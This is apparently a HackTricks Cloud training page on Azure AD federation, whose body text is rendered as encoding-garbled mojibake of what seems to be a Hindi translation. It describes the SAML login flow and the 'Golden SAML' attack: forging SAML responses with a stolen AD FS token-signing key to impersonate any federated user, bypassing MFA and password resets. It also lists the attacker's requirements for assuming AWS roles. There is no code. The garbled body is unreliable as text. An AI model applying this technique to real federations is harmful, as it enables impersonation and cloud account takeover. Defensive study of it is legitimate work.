# Az - Federation

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Basic Information

[From the docs:](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/whatis-fed)**рдлреЗрдбрд░реЗрд╢рди** рдПрдХ **рдбреЛрдореЗрди** рдХрд╛ рд╕рдВрдЧреНрд░рд╣ рд╣реИ рдЬрд┐рд╕рдиреЗ **рд╡рд┐рд╢реНрд╡рд╛рд╕** рд╕реНрдерд╛рдкрд┐рдд рдХрд┐рдпрд╛ рд╣реИред рд╡рд┐рд╢реНрд╡рд╛рд╕ рдХрд╛ рд╕реНрддрд░ рднрд┐рдиреНрди рд╣реЛ рд╕рдХрддрд╛ рд╣реИ, рд▓реЗрдХрд┐рди рдЖрдорддреМрд░ рдкрд░ рдЗрд╕рдореЗрдВ **рдкреНрд░рдорд╛рдгреАрдХрд░рдг** рд╢рд╛рдорд┐рд▓ рд╣реЛрддрд╛ рд╣реИ рдФрд░ рд▓рдЧрднрдЧ рд╣рдореЗрд╢рд╛ **рдЕрдзрд┐рдХрд╛рд░** рд╢рд╛рдорд┐рд▓ рд╣реЛрддрд╛ рд╣реИред рдПрдХ рд╕рд╛рдорд╛рдиреНрдп рдлреЗрдбрд░реЗрд╢рди рдореЗрдВ **рд╕рдВрд╕реНрдерд╛рдУрдВ рдХреА рд╕рдВрдЦреНрдпрд╛** рд╢рд╛рдорд┐рд▓ рд╣реЛ рд╕рдХрддреА рд╣реИ рдЬрд┐рдиреНрд╣реЛрдВрдиреЗ рд╕рдВрд╕рд╛рдзрдиреЛрдВ рдХреЗ рдПрдХ рд╕реЗрдЯ рдХреЗ рд▓рд┐рдП **рд╕рд╛рдЭрд╛ рдкрд╣реБрдВрдЪ** рдХреЗ рд▓рд┐рдП **рд╡рд┐рд╢реНрд╡рд╛рд╕** рд╕реНрдерд╛рдкрд┐рдд рдХрд┐рдпрд╛ рд╣реИред

рдЖрдк рдЕрдкрдиреЗ **рдСрди-рдкреНрд░рд┐рдорд╛рдЗрд╕реЗрд╕** рд╡рд╛рддрд╛рд╡рд░рдг рдХреЛ **Azure AD** рдХреЗ рд╕рд╛рде **рдлреЗрдбрд░реЗрдЯ** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЗрд╕ рдлреЗрдбрд░реЗрд╢рди рдХрд╛ рдЙрдкрдпреЛрдЧ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдФрд░ рдЕрдзрд┐рдХрд╛рд░ рдХреЗ рд▓рд┐рдП рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдпрд╣ рд╕рд╛рдЗрди-рдЗрди рд╡рд┐рдзрд┐ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░рддреА рд╣реИ рдХрд┐ рд╕рднреА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ **рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдСрди-рдкреНрд░рд┐рдорд╛рдЗрд╕реЗрд╕** рдкрд░ рд╣реЛрддрд╛ рд╣реИред рдпрд╣ рд╡рд┐рдзрд┐ рдкреНрд░рд╢рд╛рд╕рдХреЛрдВ рдХреЛ рдЕрдзрд┐рдХ рдХрдареЛрд░ рд╕реНрддрд░реЛрдВ рдХреЗ рдкрд╣реБрдВрдЪ рдирд┐рдпрдВрддреНрд░рдг рдХреЛ рд▓рд╛рдЧреВ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИред **AD FS** рдФрд░ PingFederate рдХреЗ рд╕рд╛рде рдлреЗрдбрд░реЗрд╢рди рдЙрдкрд▓рдмреНрдз рд╣реИред

<figure><img src="../../../../.gitbook/assets/image (154).png" alt=""><figcaption></figcaption></figure>

рдмреБрдирд┐рдпрд╛рджреА рд░реВрдк рд╕реЗ, рдлреЗрдбрд░реЗрд╢рди рдореЗрдВ, рд╕рднреА **рдкреНрд░рдорд╛рдгреАрдХрд░рдг** **рдСрди-рдкреНрд░рд┐рдо** рд╡рд╛рддрд╛рд╡рд░рдг рдореЗрдВ рд╣реЛрддрд╛ рд╣реИ рдФрд░ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд╕рднреА рд╡рд┐рд╢реНрд╡рд╕рдиреАрдп рд╡рд╛рддрд╛рд╡рд░рдгреЛрдВ рдореЗрдВ SSO рдХрд╛ рдЕрдиреБрднрд╡ рдХрд░рддрд╛ рд╣реИред рдЗрд╕рд▓рд┐рдП, рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЕрдкрдиреЗ **рдСрди-рдкреНрд░рд┐рдо рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ **рдХреНрд▓рд╛рдЙрдб** рдЕрдиреБрдкреНрд░рдпреЛрдЧреЛрдВ рддрдХ **рдкрд╣реБрдБрдЪ** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

**рд╕рд┐рдХреНрдпреЛрд░рд┐рдЯреА рдЕрд╕реЗрд░реНрд╢рди рдорд╛рд░реНрдХрдЕрдк рд▓реИрдВрдЧреНрд╡реЗрдЬ (SAML)** рдХрд╛ рдЙрдкрдпреЛрдЧ рд╕рднреА рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдФрд░ рдЕрдзрд┐рдХрд╛рд░ **рдЬрд╛рдирдХрд╛рд░реА** рдХреЗ **рд╡рд┐рдирд┐рдордп** рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

рдХрд┐рд╕реА рднреА рдлреЗрдбрд░реЗрд╢рди рд╕реЗрдЯрдЕрдк рдореЗрдВ рддреАрди рдкрдХреНрд╖ рд╣реЛрддреЗ рд╣реИрдВ:

* рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдпрд╛ рдХреНрд▓рд╛рдЗрдВрдЯ
* рдкрд╣рдЪрд╛рди рдкреНрд░рджрд╛рддрд╛ (IdP)
* рд╕реЗрд╡рд╛ рдкреНрд░рджрд╛рддрд╛ (SP)

(Images from https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps)

<figure><img src="../../../../.gitbook/assets/image (121).png" alt=""><figcaption></figcaption></figure>

1. рдкреНрд░рд╛рд░рдВрдн рдореЗрдВ, рдПрдХ рдЕрдиреБрдкреНрд░рдпреЛрдЧ (рд╕реЗрд╡рд╛ рдкреНрд░рджрд╛рддрд╛ рдпрд╛ SP, рдЬреИрд╕реЗ AWS рдХрдВрд╕реЛрд▓ рдпрд╛ vSphere рд╡реЗрдм рдХреНрд▓рд╛рдЗрдВрдЯ) рдХрд╛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рджреНрд╡рд╛рд░рд╛ рдПрдХреНрд╕реЗрд╕ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдпрд╣ рдХрджрдо рдмрд╛рдпрдкрд╛рд╕ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рдХреНрд▓рд╛рдЗрдВрдЯ рд╕реАрдзреЗ IdP (рдкрд╣рдЪрд╛рди рдкреНрд░рджрд╛рддрд╛) рдкрд░ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдЬреЛ рд╡рд┐рд╢рд┐рд╖реНрдЯ рдХрд╛рд░реНрдпрд╛рдиреНрд╡рдпрди рдкрд░ рдирд┐рд░реНрднрд░ рдХрд░рддрд╛ рд╣реИред
2. рдЗрд╕рдХреЗ рдмрд╛рдж, SP рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреЗ рд▓рд┐рдП рдЙрдкрдпреБрдХреНрдд IdP (рдЬреИрд╕реЗ, AD FS, Okta) рдХреА рдкрд╣рдЪрд╛рди рдХрд░рддрд╛ рд╣реИред рдлрд┐рд░ рдпрд╣ рдПрдХ SAML (рд╕рд┐рдХреНрдпреЛрд░рд┐рдЯреА рдЕрд╕реЗрд░реНрд╢рди рдорд╛рд░реНрдХрдЕрдк рд▓реИрдВрдЧреНрд╡реЗрдЬ) AuthnRequest рддреИрдпрд╛рд░ рдХрд░рддрд╛ рд╣реИ рдФрд░ рдХреНрд▓рд╛рдЗрдВрдЯ рдХреЛ рдЪреБрдиреЗ рд╣реБрдП IdP рдкрд░ рдкреБрдирдГ рдорд╛рд░реНрдЧрджрд░реНрд╢рд┐рдд рдХрд░рддрд╛ рд╣реИред
3. IdP рдЖрдЧреЗ рдмрдврд╝рддрд╛ рд╣реИ, рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХрд░рддрд╛ рд╣реИред рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреЗ рдмрд╛рдж, IdP рджреНрд╡рд╛рд░рд╛ рдПрдХ SAMLResponse рддреИрдпрд╛рд░ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдФрд░ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ SP рдХреЛ рдЕрдЧреНрд░реЗрд╖рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред
4. рдЕрдВрддрддрдГ, SP SAMLResponse рдХрд╛ рдореВрд▓реНрдпрд╛рдВрдХрди рдХрд░рддрд╛ рд╣реИред рдпрджрд┐ рд╕рдлрд▓рддрд╛рдкреВрд░реНрд╡рдХ рдорд╛рдиреНрдп рдХрд┐рдпрд╛ рдЧрдпрд╛, рдЬреЛ IdP рдХреЗ рд╕рд╛рде рдПрдХ рд╡рд┐рд╢реНрд╡рд╛рд╕ рд╕рдВрдмрдВрдз рдХреЛ рдЗрдВрдЧрд┐рдд рдХрд░рддрд╛ рд╣реИ, рддреЛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдкрд╣реБрдВрдЪ рджреА рдЬрд╛рддреА рд╣реИред рдпрд╣ рд▓реЙрдЧрд┐рди рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЗ рдкреВрд░рд╛ рд╣реЛрдиреЗ рдХреЛ рдЪрд┐рд╣реНрдирд┐рдд рдХрд░рддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд╕реЗрд╡рд╛ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддрд╛ рд╣реИред

**рдпрджрд┐ рдЖрдк SAML рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдФрд░ рд╕рд╛рдорд╛рдиреНрдп рд╣рдорд▓реЛрдВ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдирдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ, рддреЛ рдЬрд╛рдПрдВ:**

{% embed url="https://book.hacktricks.xyz/pentesting-web/saml-attacks" %}

## Pivoting

* AD FS рдПрдХ рдХреНрд▓реЗрдо-рдЖрдзрд╛рд░рд┐рдд рдкрд╣рдЪрд╛рди рдореЙрдбрд▓ рд╣реИред
* "..рдХреНрд▓реЗрдореНрд╕ рдмрд╕ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдХрд┐рдП рдЧрдП рдмрдпрд╛рдиреЛрдВ (рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдирд╛рдо, рдкрд╣рдЪрд╛рди, рд╕рдореВрд╣) рд╣реИрдВ, рдЬреЛ рдореБрдЦреНрдп рд░реВрдк рд╕реЗ рдЗрдВрдЯрд░рдиреЗрдЯ рдкрд░ рдХрд╣реАрдВ рднреА рдХреНрд▓реЗрдо-рдЖрдзрд╛рд░рд┐рдд рдЕрдиреБрдкреНрд░рдпреЛрдЧреЛрдВ рддрдХ рдкрд╣реБрдВрдЪ рдХреЛ рдЕрдзрд┐рдХреГрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВред"
* рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд▓рд┐рдП рдХреНрд▓реЗрдо SAML рдЯреЛрдХрдиреЛрдВ рдХреЗ рдЕрдВрджрд░ рд▓рд┐рдЦреЗ рдЬрд╛рддреЗ рд╣реИрдВ рдФрд░ рдлрд┐рд░ IdP рджреНрд╡рд╛рд░рд╛ рдЧреЛрдкрдиреАрдпрддрд╛ рдкреНрд░рджрд╛рди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╣рд╕реНрддрд╛рдХреНрд╖рд░рд┐рдд рд╣реЛрддреЗ рд╣реИрдВред
* рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ ImmutableID рджреНрд╡рд╛рд░рд╛ рдкрд╣рдЪрд╛рдирд╛ рдЬрд╛рддрд╛ рд╣реИред рдпрд╣ рд╡реИрд╢реНрд╡рд┐рдХ рд░реВрдк рд╕реЗ рдЕрджреНрд╡рд┐рддреАрдп рд╣реИ рдФрд░ Azure AD рдореЗрдВ рд╕рдВрдЧреНрд░рд╣реАрдд рд╣реИред
* ImmutableID рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд▓рд┐рдП рдСрди-рдкреНрд░рд┐рдо рдореЗрдВ ms-DS-ConsistencyGuid рдкрд░ рд╕рдВрдЧреНрд░рд╣реАрдд рд╣реЛрддрд╛ рд╣реИ рдФрд░/рдпрд╛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ GUID рд╕реЗ рдирд┐рдХрд╛рд▓рд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред
* рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА [https://learn.microsoft.com/en-us/windows-server/identity/ad-fs/technical-reference/the-role-of-claims](https://learn.microsoft.com/en-us/windows-server/identity/ad-fs/technical-reference/the-role-of-claims) рдореЗрдВ рд╣реИред

**рдЧреЛрд▓реНрдбрди SAML рд╣рдорд▓рд╛:**

* ADFS рдореЗрдВ, SAML Response рдХреЛ рдПрдХ рдЯреЛрдХрди-рд╣рд╕реНрддрд╛рдХреНрд╖рд░рд┐рдд рдкреНрд░рдорд╛рдгрдкрддреНрд░ рджреНрд╡рд╛рд░рд╛ рд╣рд╕реНрддрд╛рдХреНрд╖рд░рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред
* рдпрджрд┐ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рд╕реЗ рд╕рдордЭреМрддрд╛ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ Azure AD рдореЗрдВ рдХрд┐рд╕реА рднреА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд░реВрдк рдореЗрдВ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реИ рдЬреЛ Azure AD рдХреЗ рд╕рд╛рде рд╕рдордиреНрд╡рдпрд┐рдд рд╣реИ!
* рд╣рдорд╛рд░реЗ PTA рджреБрд░реБрдкрдпреЛрдЧ рдХреА рддрд░рд╣, рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд▓рд┐рдП рдкрд╛рд╕рд╡рд░реНрдб рдкрд░рд┐рд╡рд░реНрддрди рдпрд╛ MFA рдХрд╛ рдХреЛрдИ рдкреНрд░рднрд╛рд╡ рдирд╣реАрдВ рд╣реЛрдЧрд╛ рдХреНрдпреЛрдВрдХрд┐ рд╣рдо рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдХреЛ рдЬрд╛рд▓реА рдмрдирд╛ рд░рд╣реЗ рд╣реИрдВред
* рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдХреЛ DA рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдХреЗ рд╕рд╛рде AD FS рд╕рд░реНрд╡рд░ рд╕реЗ рдирд┐рдХрд╛рд▓рд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдлрд┐рд░ рдЗрд╕реЗ рдХрд┐рд╕реА рднреА рдЗрдВрдЯрд░рдиреЗрдЯ рд╕реЗ рдЬреБрдбрд╝реЗ рдорд╢реАрди рд╕реЗ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред
* рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА [https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps](https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps) рдореЗрдВ рд╣реИред

### рдЧреЛрд▓реНрдбрди SAML

рдПрдХ **рдкрд╣рдЪрд╛рди рдкреНрд░рджрд╛рддрд╛ (IdP)** рджреНрд╡рд╛рд░рд╛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд╕рд╛рдЗрди-рдЗрди рдХреЛ рдЕрдзрд┐рдХреГрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП **SAMLResponse** рдЙрддреНрдкрдиреНрди рдХрд░рдиреЗ рдХреА рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╣реИред IdP рдХреЗ рд╡рд┐рд╢рд┐рд╖реНрдЯ рдХрд╛рд░реНрдпрд╛рдиреНрд╡рдпрди рдХреЗ рдЖрдзрд╛рд░ рдкрд░, **рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛** рдХреЛ **рд╣рд╕реНрддрд╛рдХреНрд╖рд░рд┐рдд** рдпрд╛ **рдПрдиреНрдХреНрд░рд┐рдкреНрдЯреЗрдб** рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ **IdP рдХреА рдирд┐рдЬреА рдХреБрдВрдЬреА** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗред рдпрд╣ рдкреНрд░рдХреНрд░рд┐рдпрд╛ **рд╕реЗрд╡рд╛ рдкреНрд░рджрд╛рддрд╛ (SP)** рдХреЛ SAMLResponse рдХреА рдкреНрд░рд╛рдорд╛рдгрд┐рдХрддрд╛ рдХреА рдкреБрд╖реНрдЯрд┐ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИ, рдпрд╣ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░рддреЗ рд╣реБрдП рдХрд┐ рдпрд╣ рд╡рд╛рд╕реНрддрд╡ рдореЗрдВ рдПрдХ рд╡рд┐рд╢реНрд╡рд╕рдиреАрдп IdP рджреНрд╡рд╛рд░рд╛ рдЬрд╛рд░реА рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛ред

[рдЧреЛрд▓реНрдбрди рдЯрд┐рдХрдЯ рд╣рдорд▓реЗ](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/golden-ticket) рдХреЗ рд╕рд╛рде рдПрдХ рд╕рдорд╛рдирд╛рдВрддрд░ рдЦреАрдВрдЪрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдЬрд╣рд╛рдВ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреА рдкрд╣рдЪрд╛рди рдФрд░ рдЕрдиреБрдорддрд┐рдпреЛрдВ (рдЧреЛрд▓реНрдбрди рдЯрд┐рдХрдЯ рдХреЗ рд▓рд┐рдП KRBTGT, рдЧреЛрд▓реНрдбрди SAML рдХреЗ рд▓рд┐рдП рдЯреЛрдХрди-рд╣рд╕реНрддрд╛рдХреНрд╖рд░рд┐рдд рдирд┐рдЬреА рдХреБрдВрдЬреА) рдХреЛ **рдкреНрд░рдорд╛рдгреАрдХрд░рдг рд╡рд╕реНрддреБ** (TGT рдпрд╛ SAMLResponse) рдХреЛ рдЬрд╛рд▓реА рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП рд╣реЗрд░рдлреЗрд░ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдпрд╣ рдХрд┐рд╕реА рднреА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХрд╛ рдЕрдиреБрдХрд░рдг рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, SP рддрдХ рдЕрдирдзрд┐рдХреГрдд рдкрд╣реБрдВрдЪ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИред

рдЧреЛрд▓реНрдбрди SAML рдХреБрдЫ рд▓рд╛рдн рдкреНрд░рджрд╛рди рдХрд░рддреЗ рд╣реИрдВ:

* рдЗрдиреНрд╣реЗрдВ **рджреВрд░рд╕реНрде рд░реВрдк рд╕реЗ** рдмрдирд╛рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдмрд┐рдирд╛ рдбреЛрдореЗрди рдпрд╛ рдлреЗрдбрд░реЗрд╢рди рдХрд╛ рд╣рд┐рд╕реНрд╕рд╛ рдмрдиреЗред
* рдпреЗ **рджреЛ-рдХрд╛рд░рдХ рдкреНрд░рдорд╛рдгреАрдХрд░рдг (2FA)** рд╕рдХреНрд╖рдо рд╣реЛрдиреЗ рдкрд░ рднреА рдкреНрд░рднрд╛рд╡реА рд░рд╣рддреЗ рд╣реИрдВред
* рдЯреЛрдХрди-рд╣рд╕реНрддрд╛рдХреНрд╖рд░рд┐рдд **рдирд┐рдЬреА рдХреБрдВрдЬреА рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ рдирд╡реАрдиреАрдХрд░рдг рдирд╣реАрдВ рд╣реЛрддреА рд╣реИ**ред
* **рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХрд╛ рдкрд╛рд╕рд╡рд░реНрдб рдмрджрд▓рдиреЗ рд╕реЗ рдкрд╣рд▓реЗ рд╕реЗ рдЙрддреНрдкрдиреНрди SAML рдЕрдорд╛рдиреНрдп рдирд╣реАрдВ рд╣реЛрддрд╛ рд╣реИ**ред

#### AWS + AD FS + рдЧреЛрд▓реНрдбрди SAML

[рдПрдХреНрдЯрд┐рд╡ рдбрд╛рдпрд░реЗрдХреНрдЯрд░реА рдлреЗрдбрд░реЗрд╢рди рд╕рд░реНрд╡рд┐рд╕реЗрдЬ (AD FS)](https://docs.microsoft.com/en-us/previous-versions/windows/server-2008/bb897402\(v=msdn.10\)) рдПрдХ Microsoft рд╕реЗрд╡рд╛ рд╣реИ рдЬреЛ рд╡рд┐рд╢реНрд╡рд╕рдиреАрдп рд╡реНрдпрд╛рдкрд╛рд░ рднрд╛рдЧреАрджрд╛рд░реЛрдВ (рдлреЗрдбрд░реЗрд╢рди) рдХреЗ рдмреАрдЪ **рдкрд╣рдЪрд╛рди рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд╕реБрд░рдХреНрд╖рд┐рдд рд╡рд┐рдирд┐рдордп** рдХреЛ рд╕реБрд╡рд┐рдзрд╛рдЬрдирдХ рдмрдирд╛рддреА рд╣реИред рдпрд╣ рдореВрд▓ рд░реВрдк рд╕реЗ рдПрдХ рдбреЛрдореЗрди рд╕реЗрд╡рд╛ рдХреЛ рдлреЗрдбрд░реЗрд╢рди рдХреЗ рднреАрддрд░ рдЕрдиреНрдп рд╕реЗрд╡рд╛ рдкреНрд░рджрд╛рддрд╛рдУрдВ рдХреЗ рд╕рд╛рде рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдкрд╣рдЪрд╛рди рд╕рд╛рдЭрд╛ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИред

AWS рджреНрд╡рд╛рд░рд╛ рд╕рдордЭреМрддрд╛ рдХрд┐рдП рдЧрдП рдбреЛрдореЗрди (рдПрдХ рдлреЗрдбрд░реЗрд╢рди рдореЗрдВ) рдкрд░ рднрд░реЛрд╕рд╛ рдХрд░рдиреЗ рдХреЗ рд╕рд╛рде, рдЗрд╕ рднреЗрджреНрдпрддрд╛ рдХрд╛ рдЙрдкрдпреЛрдЧ рд╕рдВрднрд╛рд╡рд┐рдд рд░реВрдк рд╕реЗ **AWS рд╡рд╛рддрд╛рд╡рд░рдг рдореЗрдВ рдХрд┐рд╕реА рднреА рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЛ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ** рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рд╣рдорд▓реЗ рдХреЗ рд▓рд┐рдП **SAML рд╡рд╕реНрддреБрдУрдВ рдкрд░ рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХреА рдЬрд╛рдиреЗ рд╡рд╛рд▓реА рдирд┐рдЬреА рдХреБрдВрдЬреА** рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ, рдЬреИрд╕реЗ рдХрд┐ рдЧреЛрд▓реНрдбрди рдЯрд┐рдХрдЯ рд╣рдорд▓реЗ рдореЗрдВ KRBTGT рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИред AD FS рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЦрд╛рддреЗ рддрдХ рдкрд╣реБрдВрдЪ рдЗрд╕ рдирд┐рдЬреА рдХреБрдВрдЬреА рдХреЛ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкрд░реНрдпрд╛рдкреНрдд рд╣реИред

рдЧреЛрд▓реНрдбрди SAML рд╣рдорд▓реЗ рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрд╡рд╢реНрдпрдХрддрд╛рдПрдБ рд╣реИрдВ:

* **рдЯреЛрдХрди-рд╣рд╕реНрддрд╛рдХреНрд╖рд░рд┐рдд рдирд┐рдЬреА рдХреБрдВрдЬреА**
* **IdP рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рдкреНрд░рдорд╛рдгрдкрддреНрд░**
* **IdP рдирд╛рдо**
* **рднреВрдорд┐рдХрд╛ рдирд╛рдо (рдзрд╛рд░рдг рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рднреВрдорд┐рдХрд╛)**
* рдбреЛрдореЗрди\рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо
* AWS рдореЗрдВ рднреВрдорд┐рдХрд╛ рд╕рддреНрд░ рдХрд╛ рдирд╛рдо
* рдЕрдореЗрдЬрд╝рди рдЦрд╛рддрд╛ рдЖрдИрдбреА

_рдХреЗрд╡рд▓ рдмреЛрд▓реНрдб рдореЗрдВ рджрд┐рдП рдЧрдП рдЖрдЗрдЯрдо рдЕрдирд┐рд╡рд╛рд░реНрдп рд╣реИрдВред рдЕрдиреНрдп рдХреЛ рдЗрдЪреНрдЫрд╛рдиреБрд╕рд╛рд░ рднрд░рд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред_

